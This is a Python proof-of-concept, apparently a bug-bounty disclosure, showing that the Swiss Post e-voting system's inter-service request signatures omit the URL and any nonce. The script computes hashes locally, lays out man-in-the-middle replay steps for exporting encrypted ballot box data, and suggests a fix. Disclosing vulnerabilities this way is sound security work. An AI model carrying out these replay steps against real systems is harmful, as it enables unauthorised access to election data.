#!/usr/bin/env python3
"""
PoC: Inter-Service Signature Replay via URL Omission
Swiss Post E-Voting System (evotingBounty)

VULNERABILITY:
  SignedRequestContent.getBytes() computes the signature hash over:
    hash(method + body + originator)        [if body is non-empty]
    hash(method + originator)               [if body is empty]

  The URL is NEVER included in the signature, even though it is passed
  to the constructor. Both signing (RequestSigner.sign()) and verification
  (RequestVerifier.verifySignature()) use this same getBytes() method.

IMPACT:
  For GET requests: ALL signed GET requests from the same NodeIdentifier
  produce THE SAME signature (because GET has no body). A single captured
  GET signature is a universal credential for ANY secured GET endpoint.

  For POST/PUT: The body IS included, so cross-endpoint replay requires
  matching body content. Still allows replay to different endpoints that
  accept the same body structure.

  No nonce/timestamp in signature = signatures never expire.

AFFECTED CODE:
  SignedRequestContent.java:59-68 - getBytes() omits URL
  RequestSigner.java:26          - sign() uses getBytes()
  RequestVerifier.java:29        - verifySignature() uses getBytes()
  RestClientInterceptor.java:86  - passes URL that gets ignored
  SignedRequestFilter.java:152   - passes URL that gets ignored

AFFECTED SERVICES (all use SignedRequestFilter for .*secured.*|.*platformdata.*|.*tenantdata.*):
  api-gateway, authentication, certificate-registry, election-information,
  extended-authentication, vote-verification, voter-material, voting-workflow,
  orchestrator

ATTACK SCENARIO:
  Attacker with network position between internal services (explicitly in
  the Swiss Post e-voting attacker model) can:

  1. Capture ONE signed GET request from any node (e.g., Orchestrator
     checking ballot box status)
  2. Replay the Signature and Originator headers to ANY other secured
     GET endpoint across ANY service
  3. Example: replay Orchestrator's GET to election-information's
     "secured/tenant/{t}/electionevent/{e}/ballotbox/{b}" to export
     encrypted ballot box data

  For POST/PUT: capture a provisioning request to one service's tenantdata
  endpoint and replay to another service's tenantdata endpoint with the
  same body.

PREREQUISITES:
  - Network position between internal services (per attacker model)
  - Ability to capture one valid signed request
"""

import hashlib
import base64
import json
import sys

def demonstrate_signature_equivalence():
    """
    Demonstrates that SignedRequestContent.getBytes() produces identical
    output regardless of the URL, proving cross-endpoint replay.

    This mirrors the Java implementation:
      public byte[] getBytes() {
          StringBuilder sb = new StringBuilder();
          if (StringUtils.isEmpty(body)) {
              return sb.append(method).append(originator).toString().getBytes(UTF_8);
          } else {
              return sb.append(method).append(body).append(originator).toString().getBytes(UTF_8);
          }
      }
    """

    class SignedRequestContent:
        """Python mirror of ch.post.it.evoting.votingserver.commons.sign.beans.SignedRequestContent"""
        def __init__(self, url, method, body, originator):
            self.url = url  # STORED BUT NEVER USED IN getBytes()
            self.method = method
            self.body = body
            self.originator = originator

        def get_bytes(self):
            """Exact translation of Java getBytes() method"""
            if not self.body:  # StringUtils.isEmpty equivalent
                return (self.method + self.originator).encode('utf-8')
            else:
                return (self.method + self.body + self.originator).encode('utf-8')

    print("=" * 70)
    print("PoC: Inter-Service Signature Replay via URL Omission")
    print("=" * 70)

    # --- GET Request Replay ---
    print("\n[1] GET REQUEST REPLAY DEMONSTRATION")
    print("-" * 40)

    # NodeIdentifier enum values from the codebase
    nodes = [
        "ADMIN_PORTAL", "API_GATEWAY", "AUTHENTICATION",
        "CERTIFICATE_REGISTRY", "ELECTION_INFORMATION",
        "EXTENDED_AUTHENTICATION", "VOTER_MATERIAL",
        "VOTING_WORKFLOW", "SERVICES"
    ]

    # Simulated secured GET endpoints across different services
    get_endpoints = [
        "/voting-workflow/secured/tenant/100/electionevent/200/votingcards/states/inactive",
        "/election-information/secured/tenant/100/electionevent/200/ballotbox/300",
        "/orchestrator/mixdec/secured/tenant/100/electionevent/200/ballotbox/300",
        "/voter-material/secured/tenant/100/electionevent/200/votingcards/query",
    ]

    originator = "VOTING_WORKFLOW"

    print(f"\nOriginator: {originator}")
    print(f"\nGET requests to different endpoints produce IDENTICAL signatures:\n")

    signatures = []
    for url in get_endpoints:
        content = SignedRequestContent(url, "GET", "", originator)
        sig_bytes = content.get_bytes()
        sig_hash = hashlib.sha256(sig_bytes).hexdigest()
        signatures.append(sig_hash)
        print(f"  URL: {url}")
        print(f"  getBytes() = {sig_bytes}")
        print(f"  SHA-256    = {sig_hash}")
        print()

    all_equal = len(set(signatures)) == 1
    print(f"  ALL SIGNATURES IDENTICAL: {all_equal}")
    if all_equal:
        print(f"  => A captured GET signature from endpoint [0] can be replayed")
        print(f"     to endpoints [1], [2], [3] with no modification needed.")

    # --- POST Request Replay ---
    print("\n\n[2] POST REQUEST CROSS-SERVICE REPLAY")
    print("-" * 40)

    # Different tenantdata endpoints across services accept same body format
    post_endpoints = [
        "/authentication/tenantdata/secured/tenant/100",
        "/certificate-registry/tenantdata/secured/tenant/100",
        "/election-information/tenantdata/secured/tenant/100",
    ]

    body = '{"tenantId":"100","systemTenantId":"100"}'
    originator = "ADMIN_PORTAL"

    print(f"\nOriginator: {originator}")
    print(f"Body: {body}")
    print(f"\nPOST requests with same body to different services:\n")

    post_sigs = []
    for url in post_endpoints:
        content = SignedRequestContent(url, "POST", body, originator)
        sig_bytes = content.get_bytes()
        sig_hash = hashlib.sha256(sig_bytes).hexdigest()
        post_sigs.append(sig_hash)
        print(f"  URL: {url}")
        print(f"  getBytes() = {sig_bytes[:60]}...")
        print(f"  SHA-256    = {sig_hash}")
        print()

    all_equal = len(set(post_sigs)) == 1
    print(f"  ALL SIGNATURES IDENTICAL: {all_equal}")
    if all_equal:
        print(f"  => A captured POST to authentication/tenantdata can be")
        print(f"     replayed to election-information/tenantdata")

    # --- No Replay Protection ---
    print("\n\n[3] NO REPLAY PROTECTION (NO NONCE/TIMESTAMP)")
    print("-" * 40)

    content = SignedRequestContent(
        "/any/secured/endpoint",
        "GET",
        "",
        "ORCHESTRATOR"
    )
    sig_bytes = content.get_bytes()

    print(f"\n  Signature input: {sig_bytes}")
    print(f"  Contains nonce:     NO")
    print(f"  Contains timestamp: NO")
    print(f"  Contains URL:       NO")
    print(f"\n  => Captured signature is valid FOREVER")
    print(f"  => Can be replayed to ANY secured GET endpoint")
    print(f"  => From ANY NodeIdentifier whose signature is captured")

    # --- Concrete Attack Scenario ---
    print("\n\n[4] CONCRETE ATTACK SCENARIO")
    print("-" * 40)
    print("""
  ATTACKER MODEL: Network position between internal services
  (Explicitly in Swiss Post e-voting attacker model: "Attacker can read,
   modify, replay messages sent between components of the system")

  ATTACK STEPS:
  1. MITM between Orchestrator and any service
  2. Capture ONE legitimate signed GET request:
     GET /orchestrator/mixdec/secured/tenant/T/electionevent/E/ballotbox/B
     Headers:
       Originator: ORCHESTRATOR
       Signature: <base64-encoded-signature>

  3. Replay to election-information to export encrypted ballot box:
     GET /election-information/secured/tenant/T/electionevent/E/ballotbox/B2
     Headers:
       Originator: ORCHESTRATOR          (same)
       Signature: <base64-encoded-signature>  (same - URL not in signature)

  4. Signature filter passes because:
     - Originator is valid NodeIdentifier enum value: CHECK
     - Signature = RSA_Sign(SHA256("GET" + "ORCHESTRATOR"), private_key)
     - Verification: RSA_Verify(SHA256("GET" + "ORCHESTRATOR"), signature, pub_key) = TRUE
     - URL is NOT part of the signature computation

  5. Request proceeds to the JAX-RS endpoint handler

  FIX:
  Include URL in SignedRequestContent.getBytes():
    public byte[] getBytes() {
        StringBuilder sb = new StringBuilder();
        sb.append(url);      // ADD THIS
        sb.append(method);
        if (!StringUtils.isEmpty(body)) {
            sb.append(body);
        }
        sb.append(originator);
        // ADD: sb.append(nonce/timestamp);  // For replay protection
        return sb.toString().getBytes(StandardCharsets.UTF_8);
    }
""")

    print("=" * 70)
    return all_equal


if __name__ == "__main__":
    success = demonstrate_signature_equivalence()
    sys.exit(0 if success else 1)
